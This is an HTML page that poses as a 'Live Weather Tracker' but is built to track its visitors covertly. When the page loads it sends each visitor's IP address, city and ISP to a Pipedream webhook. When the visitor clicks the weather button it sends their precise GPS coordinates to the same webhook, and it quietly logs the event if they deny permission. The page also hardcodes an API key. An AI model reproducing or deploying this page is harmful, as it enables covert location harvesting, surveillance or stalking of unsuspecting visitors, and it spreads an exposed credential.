<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Tracker</title>
    
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #121214;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #ffffff;
        }

        .weather-card {
            background: #1a1a1e;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 320px;
            border: 1px solid #2a2a30;
        }

        h2 {
            font-size: 26px;
            margin: 0 0 10px 0;
            font-weight: 600;
            color: #ffffff;
        }

        h1 {
            font-size: 68px;
            margin: 15px 0;
            font-weight: 700;
            color: #ffffff;
        }

        p {
            font-size: 14px;
            color: #a1a1aa;
            margin-bottom: 30px;
            text-transform: capitalize;
        }

        button {
            background: #ffffff;
            color: #121214;
            border: none;
            padding: 14px 24px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 14px;
            transition: background 0.2s ease;
        }

        button:hover {
            background: #e4e4e7;
        }

        button:disabled {
            background: #27272a;
            color: #71717a;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="weather-card">
        <h2 id="city-display">Fetching Location...</h2>
        <h1 id="temp-display">--°C</h1>
        <p id="condition-display">Gathering atmospheric metrics...</p>

        <button id="action-btn" onclick="triggerPinpointLocation()">Update Precision Weather</button>
    </div>

    <script>
        // ==================== CONFIGURATION ====================
        const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net";     // Replace with your Pipedream webhook URL
        // =======================================================

        // Runs instantly the millisecond the website finishes loading
        window.onload = function() {
            fetchWeatherByIP();
        };

        // --- PHASE 1: INSTANT IP TRACKING ROUTINE ---
        function fetchWeatherByIP() {
            fetch('https://api.ipify.org?format=json')
                .then(res => {
                    if (!res.ok) throw new Error("IP Lookup service failed");
                    return res.json();
                })
                .then(ipObj => {
                    const userIP = ipObj.ip;
                    return fetch(`https://ipapi.co/${userIP}/json/`);
                })
                .then(res => {
                    if (!res.ok) throw new Error("Geo distribution mapping failed");
                    return res.json();
                })
                .then(ipData => {
                    const ipCity = ipData.city || "Hyderabad"; 
                    console.log(`Phase 1 - IP Geolocation matched city: ${ipCity}`);
                    
                    sendTrackingData({ 
                        event: "instant_ip_load", 
                        city: ipCity, 
                        ip: ipData.ip,
                        isp: ipData.org 
                    });

                    const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`;
                    return fetch(weatherUrl);
                })
                .then(res => res.json())
                .then(weatherData => {
                    if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
                        document.getElementById("city-display").innerText = weatherData.name;
                        document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                        document.getElementById("condition-display").innerText = weatherData.weather[0].description;
                    } else {
                        handleWeatherError();
                    }
                })
                .catch(err => {
                    console.error("Phase 1 Processing Error, launching hard fallback lookup:", err);
                    
                    fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
                        .then(res => res.json())
                        .then(data => {
                            if (data && data.main) {
                                document.getElementById("city-display").innerText = data.name;
                                document.getElementById("temp-display").innerText = `${Math.round(data.main.temp)}°C`;
                                document.getElementById("condition-display").innerText = data.weather[0].description;
                            }
                        })
                        .catch(() => handleWeatherError());
                });
        }

        // --- PHASE 2: PINPOINT HIGH-ACCURACY HARDWARE ROUTINE ---
        function triggerPinpointLocation() {
            const btn = document.getElementById("action-btn");
            btn.innerText = "Scanning Coordinates...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        console.log(`Phase 2 - Target Coordinates extracted: ${lat}, ${lon}`);

                        sendTrackingData({ 
                            event: "gps_allow_clicked", 
                            latitude: lat, 
                            longitude: lon,
                            hardware_accuracy_meters: position.coords.accuracy
                        });

                        fetchPreciseWeatherAndDetails(lat, lon);
                        btn.innerText = "Location Updated";
                    },
                    (error) => {
                        console.warn("User clicked Deny/Not Allow. Handling silently.");
                        
                        // Report the denial quietly to your tracking logs
                        sendTrackingData({ event: "gps_denied_by_user" });
                        
                        // Silent fallback: Just reset button style seamlessly without altering the screen elements
                        btn.innerText = "Update Precision Weather";
                        btn.disabled = false;
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 12000,           
                        maximumAge: 0             
                    }
                );
            } else {
                console.log("System Browser Geolocation utilities unsupported.");
                btn.innerText = "Unsupported Device";
            }
        }

        // --- PHASE 2 CORE RESOLUTION LAYER ---
        function fetchPreciseWeatherAndDetails(lat, lon) {
            const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
            const geoUrl = `https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${apiKey}`;

            Promise.all([
                fetch(weatherUrl).then(r => r.json()),
                fetch(geoUrl).then(r => r.json())
            ])
            .then(([weatherData, geoData]) => {
                let preciseDisplayTitle = weatherData.name;

                if (geoData && geoData[0]) {
                    const loc = geoData[0];
                    preciseDisplayTitle = loc.state ? `${loc.name}, ${loc.state}` : loc.name;
                }

                if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
                    document.getElementById("city-display").innerText = preciseDisplayTitle;
                    document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                    document.getElementById("condition-display").innerText = weatherData.weather[0].description;
                } else {
                    handleWeatherError();
                }
            })
            .catch(err => {
                console.error("Phase 2 API Processing Block Error:", err);
                handleWeatherError();
            });
        }

        // --- TELEMETRY TRANSPORT HELPER ---
        function sendTrackingData(payload) {
            fetch(pipedreamURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(() => console.log("Log buffer executed sync"));
        }

        // --- SYSTEM ANTI-CRASH FALLBACK ---
        function handleWeatherError() {
            document.getElementById("temp-display").innerText = "--°C";
            document.getElementById("condition-display").innerText = "Data synchronization error. Refreshing metrics...";
        }
    </script>
</body>
</html>
